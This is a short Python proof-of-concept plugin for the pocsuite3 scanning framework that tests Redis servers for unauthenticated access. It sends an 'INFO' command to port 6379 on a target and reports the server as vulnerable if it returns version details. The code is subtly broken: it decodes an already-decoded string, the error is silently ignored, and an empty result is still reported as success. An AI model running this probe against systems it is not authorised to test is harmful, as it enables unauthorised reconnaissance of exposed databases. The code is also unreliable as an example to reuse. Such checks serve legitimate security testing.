# -*- coding:utf-8 -*-

from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, OptString, POC_CATEGORY
from urllib.parse import urlparse
import socket
from concurrent.futures import ThreadPoolExecutor

class DemoPOC(POCBase):
    vulID = ""
    version ='1'
    author = ["LMX"]
    vulDate = ""
    createDate = "2022-2-15"
    updateDate = "2022-2-15"
    references =[]
    name ="redis 未授权访问"
    appPowerLink = ''
    appName = 'Redis'
    appVersion = ' '
    vulType = '未授权访问'
    desc = '''
    redis 未授权访问漏洞
    '''

    def _verify(self):
        result ={}
        pr = urlparse(self.url)
        socket.setdefaulttimeout(5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((pr.hostname, 6379))
        s.send(bytes("INFO\r\n", 'UTF-8'))
        rr = s.recv(1024).decode()
        try:
            if "redis_version" in rr:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = rr.decode('utf-8')
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()
register_poc(DemoPOC)